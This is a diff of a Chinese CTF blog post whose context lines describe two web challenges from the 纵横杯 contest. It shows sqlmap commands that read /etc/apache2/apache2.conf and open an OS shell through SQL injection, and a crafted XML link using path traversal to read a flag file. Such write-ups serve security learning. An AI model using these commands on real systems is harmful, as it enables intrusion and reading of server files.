@@ -54,15 +54,15 @@
 <meta property="og:site_name" content="Chen&#39;Blog">
 <meta property="og:description" content="纵横杯部分WEB题解">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://chenzidu.github.io/1.png">
-<meta property="og:image" content="https://chenzidu.github.io/2.png">
-<meta property="og:image" content="https://chenzidu.github.io/3.png">
+<meta property="og:image" content="https://chenzidu.github.io/2020/12/27/%E7%BA%B5%E6%A8%AA%E6%9D%AFCTF-WEB%E4%B8%A4%E9%A2%98/1.png">
+<meta property="og:image" content="https://chenzidu.github.io/2020/12/27/%E7%BA%B5%E6%A8%AA%E6%9D%AFCTF-WEB%E4%B8%A4%E9%A2%98/2.png">
+<meta property="og:image" content="https://chenzidu.github.io/2020/12/27/%E7%BA%B5%E6%A8%AA%E6%9D%AFCTF-WEB%E4%B8%A4%E9%A2%98/3.png">
 <meta property="article:published_time" content="2020-12-27T04:54:26.000Z">
-<meta property="article:modified_time" content="2022-12-11T09:31:21.954Z">
+<meta property="article:modified_time" content="2024-03-11T07:47:58.281Z">
 <meta property="article:author" content="ChenZIDu">
 <meta property="article:tag" content="WEB">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://chenzidu.github.io/1.png">
+<meta name="twitter:image" content="https://chenzidu.github.io/2020/12/27/%E7%BA%B5%E6%A8%AA%E6%9D%AFCTF-WEB%E4%B8%A4%E9%A2%98/1.png">
 
 <link rel="canonical" href="https://chenzidu.github.io/2020/12/27/%E7%BA%B5%E6%A8%AA%E6%9D%AFCTF-WEB%E4%B8%A4%E9%A2%98/">
 
@@ -254,7 +254,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-12-11 17:31:21" itemprop="dateModified" datetime="2022-12-11T17:31:21+08:00">2022-12-11</time>
+                <time title="修改时间：2024-03-11 15:47:58" itemprop="dateModified" datetime="2024-03-11T15:47:58+08:00">2024-03-11</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -324,7 +324,8 @@
 <a id="more"></a>
 <h1 id="easyci"><a href="#easyci" class="headerlink" title="easyci"></a>easyci</h1><p>一道SQL注入题，大概思路：sql注入写入shell，读取flag文件。<br>sqlmap先读取”&#x2F;etc&#x2F;apache2&#x2F;apache2.conf”内容。</p>
 <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="string">//eci-2ze0xe7juyhmgubdhea1.cloudeci1.ichunqiu.com/public/index.php/home/login</span> <span class="params">--data</span> <span class="string">"username=admin&amp;password=1"</span> -p username <span class="params">--technique</span> B <span class="params">--dbms</span> mysql <span class="params">--threads=10</span> <span class="params">--file-read=</span><span class="string">"/etc/apache2/apache2.conf"</span></span><br></pre></td></tr></table></figure>
-<p><img src="/1.png"></p>
+<img src="/2020/12/27/%E7%BA%B5%E6%A8%AA%E6%9D%AFCTF-WEB%E4%B8%A4%E9%A2%98/1.png" class="">
+
 <p>发现绝对路径（&#x2F;var&#x2F;sercet&#x2F;html）再写入shell</p>
 <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="string">//eci-2ze3qpk9e6qoggl1cuol.cloudeci1.ichunqiu.com/public/index.php/home/login</span> <span class="params">--data</span> <span class="string">"username=admin&amp;password=1"</span> -p username <span class="params">--technique</span> B <span class="params">--dbms</span> mysql <span class="params">--os-shell</span></span><br></pre></td></tr></table></figure>
 
@@ -332,12 +333,13 @@
 <p>这边主要是因为如果将不支持的协议的URL传递给文件系统<br>功能，则它们会将其视为本地文件路径,这边必须请求http或者https,所以构造一个httpssss即可。<br>远程vps利用python起一个web服务。</p>
 <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2.png"></p>
+<img src="/2020/12/27/%E7%BA%B5%E6%A8%AA%E6%9D%AFCTF-WEB%E4%B8%A4%E9%A2%98/2.png" class="">
+
 <p>伪造文件</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test123</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"httppp://sdxcas.com/../../../../../../../../../../../../../flag"</span>&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">test123</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>测试读取</p>
-<p><img src="/3.png"></p>
+<img src="/2020/12/27/%E7%BA%B5%E6%A8%AA%E6%9D%AFCTF-WEB%E4%B8%A4%E9%A2%98/3.png" class="">
 
     </div>
 
